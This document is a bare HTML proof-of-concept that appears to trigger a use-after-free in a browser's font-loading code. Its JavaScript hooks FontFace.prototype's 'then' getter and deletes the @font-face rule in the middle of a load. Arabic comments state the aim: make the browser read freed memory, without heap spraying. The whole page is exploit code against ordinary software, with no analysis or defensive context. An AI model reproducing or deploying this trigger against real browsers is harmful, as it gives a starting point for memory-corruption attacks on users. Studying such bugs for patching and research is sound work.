<!DOCTYPE html><html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); }
    </style>
</head>
<body>
<script>
window.onload = () => {
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            // حذف القاعدة فوراً
            document.getElementById('s').sheet.deleteRule(0);
            
            // "إجبار" النظام على محاولة إعادة المعالجة دون spray
            // هذا يجعل المتصفح يقرأ من منطقة تم تحريرها للتو
            return undefined;
        }
    });

    document.fonts.load('1em x', 'AB').catch(() => {});
};
</script>
</body>
</html>
